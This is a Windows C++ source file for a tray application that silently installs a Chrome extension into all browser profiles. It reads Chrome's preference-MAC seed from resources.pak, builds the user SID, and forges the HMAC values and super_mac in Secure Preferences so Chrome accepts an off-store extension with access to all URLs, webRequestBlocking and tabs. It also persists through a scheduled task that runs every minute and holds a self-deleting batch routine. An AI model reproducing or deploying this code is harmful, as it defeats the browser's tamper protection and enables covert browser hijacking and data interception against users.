// GCExtensionInstaller.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "GCExtensionInstaller.h"

#include <openssl/sha.h>
#include <openssl/hmac.h>

#ifdef DEBUG
#pragma comment(lib, "libcryptoMTd.lib")
#pragma comment(lib, "libsslMTd.lib")
#else
#pragma comment(lib, "libcryptoMT.lib")
#pragma comment(lib, "libsslMT.lib")

#endif // DEBUG
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")


#include <shellapi.h>
#include <tchar.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>

#include <psapi.h>
#include <shlobj_core.h>
#include <sddl.h>

#include <wchar.h>

#include "unzipper.h"
#include "json.hpp"
#include "utils.h"
#include "config.h"

using namespace std;

using json = nlohmann::json;

#define ID_TRAY_ICON 1001
#define WM_TRAYICON (WM_USER + 1)

TCHAR szPath[MAX_PATH];

vector<TCHAR*> g_vecChromeProfilePath;

TCHAR g_szChromeProfilePath[MAX_PATH];
TCHAR g_szExtensionPath[MAX_PATH];

HINSTANCE hInst;
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void AddTrayIcon(HWND hWnd);

bool getChromeProfilePaths()
{
	TCHAR szPath[MAX_PATH];
	TCHAR szSearchProfilePath[MAX_PATH];
	TCHAR szChromeUserDataPath[MAX_PATH];

	WIN32_FIND_DATA FindDirData;
	HANDLE hFind;

	if (FAILED(SHGetFolderPath(NULL,
		CSIDL_LOCAL_APPDATA | CSIDL_FLAG_CREATE,
		NULL,
		0,
		szPath)))
	{
		return false;
	}

	if (szPath[_tcslen(szPath) - 1] == _T('\\'))
		szPath[_tcslen(szPath) - 1] = 0;

	_tcscpy_s(szSearchProfilePath, MAX_PATH, szPath);
	_tcscat_s(szSearchProfilePath, MAX_PATH, _T("\\Google\\Chrome\\User Data\\Profile*"));

	_tcscpy_s(szChromeUserDataPath, MAX_PATH, szPath);
	_tcscat_s(szChromeUserDataPath, MAX_PATH, _T("\\Google\\Chrome\\User Data\\"));

	TCHAR* szDefaultProfilePath = (TCHAR*)malloc(MAX_PATH * sizeof(TCHAR));
	_tcscpy_s(szDefaultProfilePath, MAX_PATH, szPath);
	_tcscat_s(szDefaultProfilePath, MAX_PATH, _T("\\Google\\Chrome\\User Data\\Default"));
	g_vecChromeProfilePath.push_back(szDefaultProfilePath);

	hFind = FindFirstFile(szSearchProfilePath, &FindDirData);
	do {
		if (FindDirData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			TCHAR* szProfilePath = (TCHAR*)malloc(MAX_PATH * sizeof(TCHAR));
			_tcscpy_s(szProfilePath, MAX_PATH, szChromeUserDataPath);
			_tcscat_s(szProfilePath, MAX_PATH, FindDirData.cFileName);
			g_vecChromeProfilePath.push_back(szProfilePath);
		}
	} while (FindNextFile(hFind, &FindDirData) != 0);
	FindClose(hFind);

	return true;
}

std::string getExtensionID(const WCHAR *pwszPath)
{
	unsigned char hash[SHA256_DIGEST_LENGTH];
	SHA256_CTX sha256;
	SHA256_Init(&sha256);
	SHA256_Update(&sha256, pwszPath, lstrlenW(pwszPath) * 2);
	SHA256_Final(hash, &sha256);

	unsigned char outputBuffer[65];
	int i = 0;
	for (i = 0; i < SHA256_DIGEST_LENGTH; i++)
	{
		sprintf((char*)outputBuffer + (i * 2), "%02x", hash[i]);
	}
	outputBuffer[64] = 0;

	string ret;
	for (int i = 0; i < 32; i++)
	{
		if (outputBuffer[i] > 0x2F && outputBuffer[i] < 0x3A)
			ret += ('a' + (outputBuffer[i] - 0x30));
		else
			ret += ('a' + (outputBuffer[i] - 0x57));
	}

	return ret;
}

std::string getHMACSHA256(unsigned char* key, const char* pszBuffer)
{
	unsigned char hash[SHA256_DIGEST_LENGTH];

	unsigned char* digest;

	// Using sha1 hash engine here.
	// You may use other hash engines. e.g EVP_md5(), EVP_sha224, EVP_sha512, etc
	digest = HMAC(EVP_sha256(), key, 64, (const unsigned char*)pszBuffer, strlen(pszBuffer), NULL, NULL);


	char outputBuffer[65];
	int i = 0;
	for (i = 0; i < SHA256_DIGEST_LENGTH; i++)
	{
		sprintf(outputBuffer + (i * 2), "%02X", digest[i]);
	}
	outputBuffer[64] = 0;

	string ret = outputBuffer;

	return ret;
}

bool dirExists(LPCTSTR strPath)
{
	DWORD ftyp = GetFileAttributes(strPath);
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;  //something is wrong with your path!

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;   // this is a directory!

	return false;    // this is not a directory!
}

void getKey(unsigned char* ptrKey)
{
	TCHAR szChromePath[MAX_PATH];


	//////////////////////////
	TCHAR szPath[MAX_PATH];

	if (FAILED(SHGetFolderPath(NULL,
		CSIDL_LOCAL_APPDATA | CSIDL_FLAG_CREATE,
		NULL,
		0,
		szPath)))
	{
		return;
	}

	_tcscat_s(szPath, MAX_PATH, _T("\\Google\\Chrome\\Application\\"));

	/////////////////////////

	if (dirExists(_T("C:\\Program Files (x86)\\Google\\Chrome\\Application\\")))
		_tcscpy(szChromePath, _T("C:\\Program Files (x86)\\Google\\Chrome\\Application\\"));
	else if (dirExists(_T("C:\\Program Files\\Google\\Chrome\\Application\\")))
		_tcscpy(szChromePath, _T("C:\\Program Files\\Google\\Chrome\\Application\\"));
	else if (dirExists(szPath))
		_tcscpy(szChromePath, szPath);
	else
		return;


	TCHAR szFindPath[MAX_PATH] = { 0 };
	_tcscpy(szFindPath, szChromePath);
	_tcscat(szFindPath, _T("*"));

	WIN32_FIND_DATA file;
	HANDLE search_handle = FindFirstFile(szFindPath, &file);
	BOOL isFinded = FALSE;
	if (search_handle)
	{
		do
		{
			if (file.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
			{
				if (file.cFileName[0] >= L'0' && file.cFileName[0] <= L'9')
				{
					isFinded = TRUE;
					break;
				}
			}
		} while (FindNextFile(search_handle, &file));

		FindClose(search_handle);
	}

	if (isFinded != TRUE)
		return;

	_tcscpy(szFindPath, szChromePath);
	_tcscat(szFindPath, file.cFileName);
	_tcscat(szFindPath, _T("\\resources.pak"));

	DWORD version;
	DWORD encoding;
	WORD resource_count;
	WORD alias_count;
	DWORD header_size;

	SYSTEM_INFO sysinfo = { 0 };
	::GetSystemInfo(&sysinfo);
	DWORD cbView = sysinfo.dwAllocationGranularity;

	HANDLE hfile = ::CreateFile(szFindPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile != INVALID_HANDLE_VALUE)
	{
		DWORD file_size = 0;
		::GetFileSize(hfile, &file_size);
		DWORD error = GetLastError();

		HANDLE hmap = ::CreateFileMappingW(hfile, NULL, PAGE_READONLY, 0, 0, NULL);
		if (hmap != NULL)
		{
			unsigned char* pView = static_cast<unsigned char*>(
				::MapViewOfFile(hmap, FILE_MAP_READ, 0, 0, file_size));

			if (pView != NULL) {
				unsigned char* pCurPos = pView;

				version = *((DWORD*)pCurPos); pCurPos += 4;
				if (version == 4)
				{
					resource_count = *((DWORD*)pCurPos); pCurPos += 4;
					encoding = *(pCurPos); pCurPos++;
					header_size = 9;
				}
				else if (version == 5)
				{
					encoding = *((DWORD*)pCurPos); pCurPos += 4;
					resource_count = *((WORD*)pCurPos); pCurPos += 2;
					alias_count = *((WORD*)pCurPos); pCurPos += 2;
					header_size = 12;
				}
				else
				{
					::CloseHandle(hmap);
					::CloseHandle(hfile);
					return;
				}

				DWORD kIndexEntrySize = 2 + 4;

				WORD wPrevID = *((WORD*)pCurPos);
				DWORD dwPrevOffset = *((DWORD*)(pCurPos + 2));
				pCurPos += 6;

				BOOL findKey = FALSE;

				for (WORD i = 1; i < resource_count; i++)
				{
					WORD wID = *((WORD*)pCurPos);
					DWORD dwOffset = *((DWORD*)(pCurPos + 2));

					if (dwOffset - dwPrevOffset == 64)
					{
						memcpy(ptrKey, pView + dwPrevOffset, 64);
						findKey = TRUE;
						break;
					}

					dwPrevOffset = dwOffset;
					wPrevID = wID;

					pCurPos += 6;
				}
			}
			::CloseHandle(hmap);
		}
		::CloseHandle(hfile);
	}
}

int getStringSID(LPTSTR szSID)
{

	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		_tprintf(_T("OpenProcessToken failed. GetLastError returned: %d\n"),
			GetLastError());
		return -1;
	}

	DWORD dwBufferSize = 0;
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize) &&
		(GetLastError() != ERROR_INSUFFICIENT_BUFFER))
	{
		_tprintf(_T("GetTokenInformation failed. GetLastError returned: %d\n"),
			GetLastError());

		// Cleanup
		CloseHandle(hToken);
		hToken = NULL;

		return -1;
	}

	std::vector<BYTE> buffer;
	buffer.resize(dwBufferSize);
	PTOKEN_USER pTokenUser = reinterpret_cast<PTOKEN_USER>(&buffer[0]);

	if (!GetTokenInformation(
		hToken,
		TokenUser,
		pTokenUser,
		dwBufferSize,
		&dwBufferSize))
	{
		_tprintf(_T("2 GetTokenInformation failed. GetLastError returned: %d\n"),
			GetLastError());

		// Cleanup
		CloseHandle(hToken);
		hToken = NULL;

		return -1;
	}


	//
	// Check if SID is valid
	//
	if (!IsValidSid(pTokenUser->User.Sid))
	{
		_tprintf(_T("The owner SID is invalid.\n"));
		// Cleanup
		CloseHandle(hToken);
		hToken = NULL;

		return -1;
	}

	if (pTokenUser->User.Sid == NULL)
	{
		return -1;
	}

	LPTSTR pszSID = NULL;
	if (!ConvertSidToStringSid(pTokenUser->User.Sid, &pszSID))
	{
		return -1;
	}

	_tcscpy(szSID, pszSID);

	szSID[_tcslen(szSID) - 5] = 0;

	LocalFree(pszSID);
	pszSID = NULL;

	return 0;
}


json d;
json sec;
json mainfestJSON;


string string_replace(string src, string const& target, string const& repl)
{
	if (target.length() == 0) {
		return src;
	}

	if (src.length() == 0) {
		return src;
	}

	size_t idx = 0;

	for (;;) {
		idx = src.find(target, idx);
		if (idx == string::npos)  break;

		src.replace(idx, target.length(), repl);
		idx += repl.length();
	}

	return src;
}

bool getExtensionsPath(const char* szName)
{
	char destinationPath[MAX_PATH];
	ExpandEnvironmentStringsA("%APPDATA%\\BrowserExtensions\\", destinationPath, MAX_PATH);
	strcat_s(destinationPath, szName);
	CreateDirectoryRecursively(destinationPath);
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, destinationPath, strlen(destinationPath), g_szExtensionPath, MAX_PATH);
	return true;
}

bool installExtension(char* zipfilePath)
{
	char szUnzippedPath[MAX_PATH];
	ExpandEnvironmentStringsA("%TEMP%\\tempExtensions", szUnzippedPath, MAX_PATH);
	CreateDirectoryRecursively(szUnzippedPath);
	unzip(zipfilePath, szUnzippedPath);

	char szMainfestFilePath[MAX_PATH];
	strcpy_s(szMainfestFilePath, szUnzippedPath);
	strcat_s(szMainfestFilePath, "\\manifest.json");

	std::fstream mainfestFile(szMainfestFilePath);
	mainfestFile >> mainfestJSON;
	string szExtensionName = mainfestJSON["name"];

	if (!getExtensionsPath(szExtensionName.c_str()))
	{
		return false;
	}

	int size = WideCharToMultiByte(CP_UTF8, 0, g_szExtensionPath, -1, NULL, 0, NULL, NULL);
	char* szExtensionPath = new char[size];
	WideCharToMultiByte(CP_UTF8, 0, g_szExtensionPath, -1, szExtensionPath, size, NULL, NULL);
	unzip(zipfilePath, szExtensionPath);

	//################## Install Extension to All Profiles #######################
	unsigned char key[64];
	getKey(key);

	string extension_name = getExtensionID(g_szExtensionPath);

	char szExtPath[MAX_PATH];
	wcstombs(szExtPath, g_szExtensionPath, MAX_PATH);

	if (!getChromeProfilePaths())
	{
		return false;
	}

	for (int i = 0; i < g_vecChromeProfilePath.size(); i++)
	{
		char szFilePath[MAX_PATH];
		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Preferences");
		std::fstream preFile(szFilePath);

		if (!preFile) continue;

		preFile >> d;

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Secure Preferences");
		std::fstream secPreFile(szFilePath);

		if (!secPreFile) continue;

		secPreFile >> sec;

		if (d["extensions"].find("install_signature") == d["extensions"].end())
		{
			d["extensions"]["install_signature"] = json({});
			d["extensions"]["install_signature"]["ids"] = json(extension_name.c_str());
		}
		else
		{
			if (d["extensions"]["install_signature"]["ids"].find(extension_name.c_str()) == d["extensions"]["install_signature"]["ids"].end())
			{
				if (d["extensions"]["install_signature"]["ids"].is_array())
				{
					d["extensions"]["install_signature"]["ids"].push_back(extension_name.c_str());
				}
			}
		}

		string extension_json1 = "{\"active_permissions\":{\"api\":[\"browsingData\",\"contentSettings\",\"tabs\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"\\u003Call_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"scriptable_host\":[\"\\u003Call_urls>\"]},\"creation_flags\":38,\"from_bookmark\":false,\"from_webstore\":false,\"granted_permissions\":{\"api\":[\"browsingData\",\"contentSettings\",\"tabs\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"\\u003Call_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"scriptable_host\":[\"\\u003Call_urls>\"]},\"install_time\":\"13188169127141243\",\"location\":4,\"never_activated_since_loaded\":true,\"newAllowFileAccess\":true,\"path\":";
		string extension_json2 = ",\"state\":1,\"was_installed_by_default\":false,\"was_installed_by_oem\":false}";
		string ext_path = szExtPath;
		string extension_json = extension_json1 + "\"" + string_replace(ext_path, "\\", "\\\\") + "\"" + extension_json2;

		if (sec.find("extensions") == sec.end())
			sec["extensions"] = json({});

		if (sec["extensions"].find("settings") == sec["extensions"].end())
			sec["extensions"]["settings"] = json({});

		json j = json::parse(extension_json.c_str());

		sec["extensions"]["settings"][extension_name.c_str()] = j;


		if (d["extensions"].find("toolbar") == d["extensions"].end())
		{
			d["extensions"]["toolbar"] = json(extension_name.c_str());
		}
		else
		{
			if (d["extensions"]["toolbar"].find(extension_name.c_str()) == d["extensions"]["toolbar"].end())
			{
				if (d["extensions"]["toolbar"].is_array())
				{
					d["extensions"]["toolbar"].push_back(extension_name.c_str());
				}
			}
		}

		TCHAR tszSID[100];

		getStringSID(tszSID);
		TCHAR szBuffer[MAX_PATH];
		GetSystemDirectory(szBuffer, MAX_PATH);
		szBuffer[3] = 0;

		WCHAR volumeName[MAX_PATH + 1] = { 0 };
		WCHAR fileSystemName[MAX_PATH + 1] = { 0 };
		DWORD serialNumber = 0;
		DWORD maxComponentLen = 0;
		DWORD fileSystemFlags = 0;

		if (GetVolumeInformation(
			szBuffer,
			volumeName,
			sizeof(volumeName),
			&serialNumber,
			&maxComponentLen,
			&fileSystemFlags,
			fileSystemName,
			sizeof(fileSystemName)) != TRUE)
			return -1;

		char szSID[100];
		wcstombs(szSID, tszSID, 100);

		string message;
		{
			message = szSID;
			message += "extensions.settings.";
			message += extension_name;
			message += extension_json;

			string hash = getHMACSHA256(key, message.c_str());


			if (sec.find("protection") == sec.end())
			{
				sec["protection"] = json({});
				sec["protection"]["macs"] = json({});
				if (sec["protection"]["macs"].find("extensions") == sec["protection"]["macs"].end())
				{
					sec["protection"]["macs"]["extensions"] = json({});
					sec["protection"]["macs"]["extensions"]["settings"] = json({});
				}
			}
			else
			{
				if (sec["protection"].find("macs") == sec["protection"].end())
					sec["protection"]["macs"] = json({});

				if (sec["protection"]["macs"].find("extensions") == sec["protection"]["macs"].end())
					sec["protection"]["macs"]["extensions"] = json({});

				if (sec["protection"]["macs"]["extensions"].find("settings") == sec["protection"]["macs"]["extensions"].end())
					sec["protection"]["macs"]["extensions"]["settings"] = json({});
			}

			sec["protection"]["macs"]["extensions"]["settings"][extension_name.c_str()] = json(hash.c_str());
		}

		string _str = sec["protection"]["macs"].dump();

		message = szSID + _str;

		string supermac = getHMACSHA256(key, message.c_str());

		sec["protection"]["super_mac"] = json(supermac.c_str());

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Preferences");
		std::ofstream outPreFile(szFilePath);
		outPreFile << d;

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Secure Preferences");
		std::ofstream outSecPreFile(szFilePath);
		outSecPreFile << sec;

	}

	return true;
}

BOOL GetParameter()
{
	LPWSTR cmdLine = GetCommandLineW();
	int argc = 0;
	LPWSTR* argv = CommandLineToArgvW(cmdLine, &argc);

	if (argc > 1)
	{
		return true;
	}


	return false;
}

void DoClearFolderNotExit()
{
	// Step 1: Get the application directory path
	WCHAR appPath[MAX_PATH];
	DWORD pathLength = GetModuleFileNameW(NULL, appPath, MAX_PATH);
	if (pathLength == 0) {
		// Handle path retrieval failure
		return;
	}

	WCHAR* lastSlash = wcsrchr(appPath, L'\\');
	if (lastSlash == NULL) {
		// Handle invalid path
		return;
	}

	*lastSlash = L'\0'; // Set the last slash to null-terminator to get the directory path

	// Step 3: Create and execute the deletion script
	WCHAR scriptPath[MAX_PATH];
	wcscpy_s(scriptPath, MAX_PATH, appPath);
	wcscat_s(scriptPath, MAX_PATH, L"\\delete_files.bat");

	FILE* scriptFile = _wfopen(scriptPath, L"w");
	if (scriptFile == NULL) {
		// Handle script file creation failure
		return;
	}

	// Write the commands to the script file
	fprintf(scriptFile, "@echo off\n");
	fprintf(scriptFile, "timeout 10\n");
	fprintf(scriptFile, "cd /d \"%ls\"\n", appPath);
	fprintf(scriptFile, "rmdir /s /q anim\n");
	fprintf(scriptFile, "del /q /s *.*\n");
	fprintf(scriptFile, "exit\n");

	fclose(scriptFile);

	// Execute the deletion script
	STARTUPINFOW startupInfo;
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	ZeroMemory(&processInfo, sizeof(processInfo));
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.dwFlags |= STARTF_USESHOWWINDOW;
	startupInfo.wShowWindow = SW_HIDE;

	if (!CreateProcessW(NULL, scriptPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo)) {
		// Handle script execution failure
		return;
	}

	// Step 2: Terminate the application
	//ExitProcess(0);

	// The code beyond this point will not be executed as the process will be terminated



	CloseHandle(processInfo.hProcess);
	CloseHandle(processInfo.hThread);
}

void CopyAllFiles()
{
	// Get the path of the current executable
	char path[MAX_PATH];
	GetModuleFileNameA(NULL, path, MAX_PATH);

	// Extract the directory path from the executable path
	char* lastBackslash = strrchr(path, '\\');
	if (lastBackslash != NULL)
		*(lastBackslash + 1) = '\0';

	// Get the value of the %localappdata% variable
	char destinationPath[MAX_PATH];
	// char destinationAnimPath[MAX_PATH];
	ExpandEnvironmentStringsA(BASE_PATH, destinationPath, MAX_PATH);

	//create path
	CreateDirectoryRecursively(destinationPath);

	//char animPath[MAX_PATH];
	//snprintf(animPath, MAX_PATH, "%s%s", path, "anim");
	//std:filesystem::copy(animPath, destinationAnimPath, std::filesystem::copy_options::overwrite_existing | std::filesystem::copy_options::recursive);

	// Copy files from the current directory to the destination directory
	WIN32_FIND_DATAA findData;
	char searchPath[MAX_PATH];
	snprintf(searchPath, MAX_PATH, "%s%s", path, "*.*");
	HANDLE findHandle = FindFirstFileA(searchPath, &findData);
	if (findHandle != INVALID_HANDLE_VALUE) {
		do {
			if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				char sourceFile[MAX_PATH];
				char destinationFile[MAX_PATH];
				snprintf(sourceFile, MAX_PATH, "%s%s", path, findData.cFileName);
				snprintf(destinationFile, MAX_PATH, "%s\\%s", destinationPath, findData.cFileName);
				CopyFileA(sourceFile, destinationFile, FALSE);
			}
		} while (FindNextFileA(findHandle, &findData));

		FindClose(findHandle);
	}
}

int DeleteDirectory(const std::wstring& refcstrRootDirectory,
	bool              bDeleteSubdirectories = true)
{
	bool            bSubdirectory = false;       // Flag, indicating whether
	// subdirectories have been found
	HANDLE          hFile;                       // Handle to directory
	std::wstring     strFilePath;                 // Filepath
	std::wstring     strPattern;                  // Pattern
	WIN32_FIND_DATA FileInformation;             // File information


	strPattern = refcstrRootDirectory + L"\\*.*";
	hFile = ::FindFirstFile(strPattern.c_str(), &FileInformation);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (FileInformation.cFileName[0] != L'.')
			{
				strFilePath.erase();
				strFilePath = refcstrRootDirectory + L"\\" + FileInformation.cFileName;

				if (FileInformation.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if (bDeleteSubdirectories)
					{
						// Delete subdirectory
						int iRC = DeleteDirectory(strFilePath, bDeleteSubdirectories);
						if (iRC)
							return iRC;
					}
					else
						bSubdirectory = true;
				}
				else
				{
					// Set file attributes
					if (::SetFileAttributes(strFilePath.c_str(),
						FILE_ATTRIBUTE_NORMAL) == FALSE)
						return ::GetLastError();

					// Delete file
					if (::DeleteFile(strFilePath.c_str()) == FALSE)
						return ::GetLastError();
				}
			}
		} while (::FindNextFile(hFile, &FileInformation) == TRUE);

		// Close handle
		::FindClose(hFile);

		DWORD dwError = ::GetLastError();
		if (dwError != ERROR_NO_MORE_FILES)
			return dwError;
		else
		{
			if (!bSubdirectory)
			{
				// Set directory attributes
				if (::SetFileAttributes(refcstrRootDirectory.c_str(),
					FILE_ATTRIBUTE_NORMAL) == FALSE)
					return ::GetLastError();

				// Delete directory
				if (::RemoveDirectory(refcstrRootDirectory.c_str()) == FALSE)
					return ::GetLastError();
			}
		}
	}

	return 0;
}

bool uninstallExtension()
{
	if (!getExtensionsPath("NewEngine"))
	{
		return 0;
	}

	if (!getChromeProfilePaths())
	{
		return 0;
	}

	unsigned char key[64];
	getKey(key);

	string extension_name = getExtensionID(g_szExtensionPath);

	char szExtPath[MAX_PATH];
	wcstombs(szExtPath, g_szExtensionPath, MAX_PATH);

	for (int i = 0; i < g_vecChromeProfilePath.size(); i++)
	{
		char szFilePath[MAX_PATH];
		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Preferences");
		std::fstream preFile(szFilePath);

		if (!preFile) continue;

		preFile >> d;

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Secure Preferences");
		std::fstream secPreFile(szFilePath);

		if (!secPreFile) continue;

		secPreFile >> sec;

		if (d["extensions"].find("install_signature") != d["extensions"].end())
		{
			if (d["extensions"]["install_signature"]["ids"].find(extension_name) != d["extensions"]["install_signature"]["ids"].end())
			{
				d["extensions"]["install_signature"]["ids"].erase(d["extensions"]["install_signature"]["ids"].find(extension_name));
			}
		}

		string extension_json1 = "{\"active_permissions\":{\"api\":[\"browsingData\",\"contentSettings\",\"tabs\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"\\u003Call_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"scriptable_host\":[\"\\u003Call_urls>\"]},\"creation_flags\":38,\"from_bookmark\":false,\"from_webstore\":false,\"granted_permissions\":{\"api\":[\"browsingData\",\"contentSettings\",\"tabs\",\"webRequest\",\"webRequestBlocking\"],\"explicit_host\":[\"*://*/*\",\"\\u003Call_urls>\",\"chrome://favicon/*\",\"http://*/*\",\"https://*/*\"],\"scriptable_host\":[\"\\u003Call_urls>\"]},\"install_time\":\"13188169127141243\",\"location\":4,\"never_activated_since_loaded\":true,\"newAllowFileAccess\":true,\"path\":";
		string extension_json2 = ",\"state\":1,\"was_installed_by_default\":false,\"was_installed_by_oem\":false}";
		string ext_path = szExtPath;
		string extension_json = extension_json1 + "\"" + string_replace(ext_path, "\\", "\\\\") + "\"" + extension_json2;

		if (sec.find("extensions") != sec.end())
		{
			if (sec["extensions"].find("settings") != sec["extensions"].end())
			{
				if (sec["extensions"]["settings"].find(extension_name) != sec["extensions"]["settings"].end())
				{
					sec["extensions"]["settings"].erase(sec["extensions"]["settings"].find(extension_name));
				}
			}
		}


		if (d["extensions"].find("toolbar") != d["extensions"].end())
		{
			if (d["extensions"]["toolbar"].find(extension_name) != d["extensions"]["toolbar"].end())
			{
				d["extensions"]["toolbar"].erase(d["extensions"]["toolbar"].find(extension_name));
			}
		}

		TCHAR tszSID[100];

		getStringSID(tszSID);

		TCHAR szBuffer[MAX_PATH];
		GetSystemDirectory(szBuffer, MAX_PATH);
		szBuffer[3] = 0;

		WCHAR volumeName[MAX_PATH + 1] = { 0 };
		WCHAR fileSystemName[MAX_PATH + 1] = { 0 };
		DWORD serialNumber = 0;
		DWORD maxComponentLen = 0;
		DWORD fileSystemFlags = 0;

		if (GetVolumeInformation(
			szBuffer,
			volumeName,
			sizeof(volumeName),
			&serialNumber,
			&maxComponentLen,
			&fileSystemFlags,
			fileSystemName,
			sizeof(fileSystemName)) != TRUE)
			return -1;

		char szSID[100];
		wcstombs(szSID, tszSID, 100);

		string message;
		{
			message = szSID;
			message += "extensions.settings.";
			message += extension_name;
			message += extension_json;

			string hash = getHMACSHA256(key, message.c_str());


			if (sec.find("protection") != sec.end())
			{
				if (sec["protection"].find("macs") != sec["protection"].end())
				{
					if (sec["protection"]["macs"].find("extensions") != sec["protection"]["macs"].end())
					{
						if (sec["protection"]["macs"]["extensions"].find("settings") != sec["protection"]["macs"]["extensions"].end())
						{
							if (sec["protection"]["macs"]["extensions"]["settings"].find(extension_name.c_str()) != sec["protection"]["macs"]["extensions"]["settings"].end())
							{
								sec["protection"]["macs"]["extensions"]["settings"].erase(sec["protection"]["macs"]["extensions"]["settings"].find(extension_name.c_str()));

								string _str = sec["protection"]["macs"].dump();

								message = szSID + _str;
								string supermac = getHMACSHA256(key, message.c_str());
								sec["protection"]["super_mac"] = json(supermac.c_str());
							}
						}
					}
				}
			}
		}

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Preferences");
		std::ofstream outPreFile(szFilePath);
		outPreFile << d;

		wcstombs(szFilePath, g_vecChromeProfilePath[i], MAX_PATH);
		strcat(szFilePath, "\\Secure Preferences");
		std::ofstream outSecPreFile(szFilePath);
		outSecPreFile << sec;

	}

	DeleteDirectory(g_szExtensionPath);

	return true;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	HANDLE hMutex = CreateMutexA(NULL, TRUE, MUTEX_NAME);
	if (hMutex == NULL || GetLastError() == ERROR_ALREADY_EXISTS) {
		return 1;
	}

	BOOL serviceRun = GetParameter();

	if (serviceRun) {
		hInst = hInstance;
		WNDCLASSEXA wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WindowProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, "TrayIconClass", NULL };
		RegisterClassExA(&wc);

		HWND hWnd = CreateWindowA("TrayIconClass", "Tray Icon App", WS_OVERLAPPEDWINDOW, 100, 100, 300, 300, NULL, NULL, wc.hInstance, NULL);

		ShowWindow(hWnd, SW_HIDE);
		UpdateWindow(hWnd);

		AddTrayIcon(hWnd);

		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		return (int)msg.wParam;
	}
	else {
		// move file to target
		CopyAllFiles();
		MakeSchedule("PT1M");
		//DoClearFolderNotExit();
	}

	return 0;
}


std::string GetCurrentProcessPath() {
	char buffer[MAX_PATH];
	DWORD size = GetModuleFileNameA(NULL, buffer, MAX_PATH);
	if (size == 0) {
		// Handle error
		return "";
	}
	return std::string(buffer, size);
}

std::string GetDirectoryFromPath(const std::string& path) {
	size_t pos = path.find_last_of("\\/");
	return (std::string::npos == pos) ? "" : path.substr(0, pos);
}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	static BOOL isEnabled = FALSE;

	std::string processPath = GetCurrentProcessPath();
	std::string processDir = GetDirectoryFromPath(processPath);

	std::string targetFile = processDir + EXTENSIONNAME;

	switch (uMsg) {
	case WM_TRAYICON:
		switch (lParam) {
		case WM_LBUTTONDOWN:
			isEnabled = !isEnabled;

			if (isEnabled) {
				installExtension((char*)targetFile.c_str());
			}
			else {
				uninstallExtension();
			}

			NOTIFYICONDATAA nid;
			ZeroMemory(&nid, sizeof(nid));

			nid.cbSize = sizeof(NOTIFYICONDATA);
			nid.hWnd = hWnd;
			nid.uID = ID_TRAY_ICON;
			nid.uFlags = NIF_ICON | NIF_TIP;
			nid.hIcon = LoadIcon(hInst, MAKEINTRESOURCE(isEnabled ? IDI_ENABLED : IDI_DISABLED));
			strcpy_s(nid.szTip, isEnabled ? "Enabled" : "Disabled");

			Shell_NotifyIconA(NIM_MODIFY, &nid);
			break;
		case WM_RBUTTONDOWN:
			PostQuitMessage(0);
			break;
		}
		break;
	case WM_DESTROY:
		NOTIFYICONDATA nid;
		ZeroMemory(&nid, sizeof(nid));

		nid.cbSize = sizeof(NOTIFYICONDATA);
		nid.hWnd = hWnd;
		nid.uID = ID_TRAY_ICON;

		Shell_NotifyIcon(NIM_DELETE, &nid);
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, uMsg, wParam, lParam);
	}
	return 0;
}

void AddTrayIcon(HWND hWnd) {
	NOTIFYICONDATAA nid;
	ZeroMemory(&nid, sizeof(nid));

	nid.cbSize = sizeof(NOTIFYICONDATA);
	nid.hWnd = hWnd;
	nid.uID = ID_TRAY_ICON;
